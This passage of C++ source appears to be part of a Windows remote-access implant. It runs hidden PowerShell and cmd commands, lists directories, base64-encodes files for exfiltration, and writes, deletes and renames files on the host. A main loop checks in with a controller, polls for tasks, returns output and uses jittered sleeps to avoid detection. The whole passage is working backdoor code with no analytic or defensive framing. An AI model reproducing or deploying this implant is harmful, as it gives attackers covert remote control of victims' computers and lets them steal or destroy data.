    PROCESS_INFORMATION pi{};
    STARTUPINFOA si{};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hStdoutWr;
    si.hStdError = hStdoutWr;

    string full_cmd = "powershell.exe -NoProfile -NonInteractive -Command " + escaped_cmd;
    vector<char> cmd_line(full_cmd.begin(), full_cmd.end());
    cmd_line.push_back('\0');

    BOOL success = CreateProcessA(nullptr, cmd_line.data(), nullptr, nullptr, TRUE,
                                  CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
    CloseHandle(hStdoutWr);

    if (!success) {
        DWORD error = GetLastError();
        CloseHandle(hStdoutRd);
        return "[-] PowerShell execution error: " + to_string(error);
    }

    string result;
    DWORD bytesRead;
    char buffer[4096];
    while (ReadFile(hStdoutRd, buffer, sizeof(buffer) - 1, &bytesRead, nullptr) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        result += buffer;
    }

    DWORD exitCode = 0;
    WaitForSingleObject(pi.hProcess, INFINITE);
    GetExitCodeProcess(pi.hProcess, &exitCode);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hStdoutRd);

    string output = result;
    size_t start = output.find_first_not_of(" \t\r\n");
    if (start != string::npos) {
        size_t end = output.find_last_not_of(" \t\r\n");
        output = output.substr(start, end - start + 1);
    }
    if (exitCode != 0) output += "\n[Exit Code: " + to_string(exitCode) + "]";
    return output.empty() ? "[+] PowerShell command executed (no output)" : output;
}

Json browse_directory(const string& path) {
    Json result = Json::object();
    try {
        string actual_path = path;
        if (actual_path.find('~') == 0) {
            char* home = getenv("USERPROFILE");
            if (home) {
                actual_path = string(home) + actual_path.substr(1);
            }
        }

        if (!std::filesystem::exists(actual_path)) {
            result["success"] = false;
            result["error"] = "Path does not exist: " + actual_path;
            result["current_path"] = actual_path;
            result["parent_path"] = nullptr;
            result["items"] = Json::array();
            return result;
        }

        Json items = Json::array();
        for (const auto& entry : std::filesystem::directory_iterator(actual_path)) {
            try {
                Json item = Json::object();
                item["name"] = entry.path().filename().string();
                item["type"] = entry.is_directory() ? "directory" : "file";
                item["size"] = entry.is_directory() ? 0 : (double)entry.file_size();
                
                auto ftime = entry.last_write_time();
                auto time_t = std::chrono::system_clock::to_time_t(
                    std::chrono::time_point_cast<std::chrono::system_clock::duration>(
                        ftime - std::filesystem::file_time_type::clock::now() + 
                        std::chrono::system_clock::now()
                    )
                );
                stringstream ss;
                ss << std::put_time(std::localtime(&time_t), "%Y-%m-%d %H:%M:%S");
                item["modified_time"] = ss.str();
                
                items.push_back(item);
            } catch (const std::exception&) {
                continue;
            }
        }

        result["success"] = true;
        result["current_path"] = actual_path;
        
        std::filesystem::path parent = std::filesystem::path(actual_path).parent_path();
        if (actual_path.size() >= 2 && actual_path[1] == ':' && actual_path.size() == 3 && actual_path[2] == '\\') {
            result["parent_path"] = nullptr;
        } else if (parent.empty()) {
            result["parent_path"] = nullptr;
        } else {
            result["parent_path"] = parent.string();
        }
        result["items"] = items;
    } catch (const std::exception& e) {
        result["success"] = false;
        result["error"] = e.what();
        result["current_path"] = path;
        result["parent_path"] = nullptr;
        result["items"] = Json::array();
    }
    return result;
}

string download_file(const string& filepath) {
    try {
        if (!std::filesystem::exists(filepath)) {
            return "ERROR: File not found: " + filepath;
        }
        
        if (std::filesystem::is_directory(filepath)) {
            return "ERROR: Cannot download directory: " + filepath;
        }
        
        ifstream file(filepath, ios::binary);
        if (!file) {
            return "ERROR: Cannot open file: " + filepath;
        }
        
        vector<unsigned char> file_data((istreambuf_iterator<char>(file)), 
                                        istreambuf_iterator<char>());
        file.close();
        
        string filename = std::filesystem::path(filepath).filename().string();
        size_t filesize = file_data.size();
        string encoded = base64_encode(string((char*)file_data.data(), file_data.size()));
        
        return "file-data:" + filename + "|" + to_string(filesize) + "|" + encoded;
    } catch (const std::exception& e) {
        return "ERROR: " + string(e.what());
    }
}

string upload_file(const string& filepath, const string& filedata_b64) {
    try {
        string decoded_data = base64_decode(filedata_b64);
        vector<unsigned char> file_data(decoded_data.begin(), decoded_data.end());
        
        std::filesystem::path path_obj(filepath);
        std::filesystem::create_directories(path_obj.parent_path());
        
        ofstream file(filepath, ios::binary);
        if (!file) {
            return "ERROR: Cannot write file: " + filepath;
        }
        file.write(reinterpret_cast<const char*>(file_data.data()), file_data.size());
        file.close();
        
        return "SUCCESS: File uploaded to " + filepath;
    } catch (const std::exception& e) {
        return "ERROR: " + string(e.what());
    }
}

string delete_file(const string& filepath) {
    try {
        if (!std::filesystem::exists(filepath)) {
            return "ERROR: Path does not exist: " + filepath;
        }
        
        if (std::filesystem::is_directory(filepath)) {
            std::filesystem::remove_all(filepath);
            return "SUCCESS: Deleted directory " + filepath;
        } else {
            std::filesystem::remove(filepath);
            return "SUCCESS: Deleted file " + filepath;
        }
    } catch (const std::exception& e) {
        return "ERROR: " + string(e.what());
    }
}

string rename_file(const string& old_path, const string& new_path) {
    try {
        if (!std::filesystem::exists(old_path)) {
            return "ERROR: Source path does not exist: " + old_path;
        }
        
        std::filesystem::rename(old_path, new_path);
        return "SUCCESS: Renamed to " + new_path;
    } catch (const std::exception& e) {
        return "ERROR: " + string(e.what());
    }
}

string execute_command(const string& cmd) {
    string trimmed = cmd;
    size_t start = trimmed.find_first_not_of(" \t\r\n");
    if (start != string::npos) {
        size_t end = trimmed.find_last_not_of(" \t\r\n");
        trimmed = trimmed.substr(start, end - start + 1);
    }
    if (trimmed.empty()) return "[no command]";

    string lower_cmd = trimmed;
    transform(lower_cmd.begin(), lower_cmd.end(), lower_cmd.begin(), ::tolower);
    if (lower_cmd == "ping") return "pong";

    if (trimmed.find("browse:") == 0) {
        string browse_path = trimmed.substr(7);
        while (!browse_path.empty() && browse_path.front() == ' ') browse_path.erase(0, 1);
        if (browse_path.empty()) {
            browse_path = std::filesystem::current_path().string();
        }
        Json dir_data = browse_directory(browse_path);
        string json_str = dir_data.dump();
        string base64_data = base64_encode(json_str);
        return "browse-data-" + base64_data;
    }

    if (trimmed.find("download-file:") == 0) {
        string filepath = trimmed.substr(14);
        while (!filepath.empty() && filepath.front() == ' ') filepath.erase(0, 1);
        return download_file(filepath);
    }

    if (trimmed.find("upload-file:") == 0) {
        string rest = trimmed.substr(12);
        size_t sep_pos = rest.find('|');
        if (sep_pos != string::npos) {
            string filepath = rest.substr(0, sep_pos);
            string filedata_b64 = rest.substr(sep_pos + 1);
            return upload_file(filepath, filedata_b64);
        } else {
            return "ERROR: Invalid upload format. Use: upload-file:path|base64_data";
        }
    }

    if (trimmed.find("delete-file:") == 0) {
        string filepath = trimmed.substr(12);
        while (!filepath.empty() && filepath.front() == ' ') filepath.erase(0, 1);
        return delete_file(filepath);
    }

    if (trimmed.find("rename-file:") == 0) {
        string rest = trimmed.substr(12);
        size_t sep_pos = rest.find('|');
        if (sep_pos != string::npos) {
            string old_path = rest.substr(0, sep_pos);
            string new_path = rest.substr(sep_pos + 1);
            return rename_file(old_path, new_path);
        } else {
            return "ERROR: Invalid rename format. Use: rename-file:old_path|new_path";
        }
    }

    string upper_cmd = trimmed;
    transform(upper_cmd.begin(), upper_cmd.end(), upper_cmd.begin(), ::toupper);

    if (upper_cmd.length() >= 3 && upper_cmd.substr(0, 3) == "EP ") {
        string ps_cmd = trimmed.substr(3);
        size_t s = ps_cmd.find_first_not_of(" \t\r\n");
        if (s != string::npos) ps_cmd = ps_cmd.substr(s);
        return run_powershell_command(ps_cmd);
    }
    if (upper_cmd.length() >= 2 && upper_cmd.substr(0, 2) == "EP") {
        string ps_cmd = trimmed.substr(2);
        size_t s = ps_cmd.find_first_not_of(" \t\r\n");
        if (s != string::npos) ps_cmd = ps_cmd.substr(s);
        return run_powershell_command(ps_cmd);
    }
    return run_cmd_command(trimmed);
}

void main_loop() {
    des = new DESCipher(KEY);

    int attempts = 0;
    while (session_id.empty()) {
        attempts++;
        if (checkin()) {
            break;
        }
        int wait_time = rand() % 40000 + 20000;
        this_thread::sleep_for(chrono::milliseconds(wait_time));
    }

    while (true) {
        try {
            string cmd = get_tasks();
            if (!cmd.empty()) {
                string result = execute_command(cmd);
                submit_output(result);
            }
            apply_jitter();
        }
        catch (exception& e) {
            int wait_time = rand() % 90000 + 30000;
            this_thread::sleep_for(chrono::milliseconds(wait_time));
        }
    }
}

int main() {
    srand(static_cast<unsigned>(time(nullptr)));

    HINTERNET hInternet = InternetOpenA(DEFAULT_USER_AGENT.c_str(), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        return 1;
    }
    InternetCloseHandle(hInternet);

    main_loop();
    return 0;
}
